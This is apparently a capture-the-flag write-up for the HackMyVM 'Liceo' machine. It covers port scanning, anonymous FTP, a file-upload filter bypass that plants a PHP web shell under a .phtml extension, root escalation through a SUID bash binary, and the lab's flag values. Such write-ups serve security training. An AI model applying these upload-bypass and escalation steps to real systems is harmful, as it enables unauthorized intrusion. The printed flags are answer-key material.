# Liceo

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.101:21
Open 10.0.2.101:22
Open 10.0.2.101:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.101
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEwZ1vknI6B5ldjpFrlrBx3wmdRq0g9D2vHkGSZF0mqDslvgXA+SYmiBN3ETYhTH8Hh1tVKjGtZADp40fHMfQ1I=
|   256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDWFL2zQHLdSxoHaT8QP6jL3ok4bNN0uWWAMCwK7a5Nx
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Liceo
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## FTP

```bash
└─$ ftp anonymous@10.0.2.101
Password:
ftp> ls
-rw-rw-r--    1 1000     1000          191 Feb 01  2024 note.txt
ftp> get note.txt
ftp> exit

└─$ cat note.txt
Hi Matias, I have left on the web the continuations of today's work,
would you mind contiuing in your turn and make sure that the web will be secure?
Above all, we dont't want intruders...
```

## HTTP

![writeup.png](/assets/pentest/hackmyvm/liceo/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.101 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET       20l       35w      448c http://10.0.2.101/js/custom.js
200      GET     4440l    10999w   131868c http://10.0.2.101/js/bootstrap.js
200      GET        2l     1276w    88145c http://10.0.2.101/js/jquery-3.4.1.min.js
200      GET      621l     1442w    21487c http://10.0.2.101/index.html
200      GET      621l     1442w    21487c http://10.0.2.101/
301      GET        9l       28w      309c http://10.0.2.101/images => http://10.0.2.101/images/
301      GET        9l       28w      305c http://10.0.2.101/js => http://10.0.2.101/js/
301      GET        9l       28w      310c http://10.0.2.101/uploads => http://10.0.2.101/uploads/
200      GET       15l       29w      371c http://10.0.2.101/upload.php
```

### Upload Bypass

The `php` extension is disabled, however recently I encountered challenge which allowed `phtml` so that's the first thing I tried and it worked.
```bash
└─$ curl http://10.0.2.101/upload.php -F 'archivo=test; filename=t.php; type=image/gif' -F 'submit=Upload File' -s | tail -1 | trans -b :en
Error: Files with the php extension are not allowed.

└─$ curl http://10.0.2.101/upload.php -F 'archivo=@/opt/scripts/shells/p0wny-shell/shell.php; filename=t.phtml; type=image/gif' -F 'submit=Upload File' -s | tail -1 | trans -b :en
The t.phtml file has been uploaded successfully.
```

### RCE

![writeup-1.png](/assets/pentest/hackmyvm/liceo/writeup-1.png)

Doesn't seem to be anything in zip
```bash
www-data@liceoserver:…/www/html# mkdir /tmp/liceoweb
www-data@liceoserver:…/www/html# unzip -x ./liceoweb.zip -d /tmp/liceoweb
www-data@liceoserver:…/www/html# diff -qr . /tmp/liceoweb
Files ./index.html and /tmp/liceoweb/index.html differ
Only in .: liceoweb.zip
Only in .: upload.php
Only in .: uploads
```

## Privilege Escalation

Amazing
```bash
www-data@liceoserver:…/www/html# find / -perm -4000 -ls 2>/dev/null | grep -v /snap/
    10243    136 -rwsr-xr-x   1 root     root              138408 May 29  2023 /usr/lib/snapd/snap-confine
     1410     36 -rwsr-xr--   1 root     messagebus         35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    38991    332 -rwsr-xr-x   1 root     root              338536 Jan  2  2024 /usr/lib/openssh/ssh-keysign
      875     60 -rwsr-xr-x   1 root     root               59976 Nov 24  2022 /usr/bin/passwd
      897     32 -rwsr-xr-x   1 root     root               30872 Feb 26  2022 /usr/bin/pkexec
      841     40 -rwsr-xr-x   1 root     root               40496 Nov 24  2022 /usr/bin/newgrp
      696     72 -rwsr-xr-x   1 root     root               72072 Nov 24  2022 /usr/bin/gpasswd
     1111     56 -rwsr-xr-x   1 root     root               55672 Feb 21  2022 /usr/bin/su
      572     44 -rwsr-xr-x   1 root     root               44808 Nov 24  2022 /usr/bin/chsh
      566     72 -rwsr-xr-x   1 root     root               72712 Nov 24  2022 /usr/bin/chfn
      829     48 -rwsr-xr-x   1 root     root               47480 Feb 21  2022 /usr/bin/mount
     1187     36 -rwsr-xr-x   1 root     root               35192 Feb 21  2022 /usr/bin/umount
     1112    228 -rwsr-xr-x   1 root     root              232416 Apr  3  2023 /usr/bin/sudo
      517   1364 -rwsr-sr-x   1 root     root             1396520 Jan  6  2022 /usr/bin/bash # <---
      680     36 -rwsr-xr-x   1 root     root               35200 Mar 23  2022 /usr/bin/fusermount3
    13735     20 -rwsr-xr-x   1 root     root               18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
```

```bash
www-data@liceoserver:…/www/html# /usr/bin/bash -p -c 'id'
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

## Flags

```bash
www-data@liceoserver:…/www/html# /usr/bin/bash -p -c 'cat /home/dev/user.txt /root/root.txt'
71ab613fa286844425523780a7ebbab2
BF9A57023EDD8CFAB92B8EA516676B0D
```
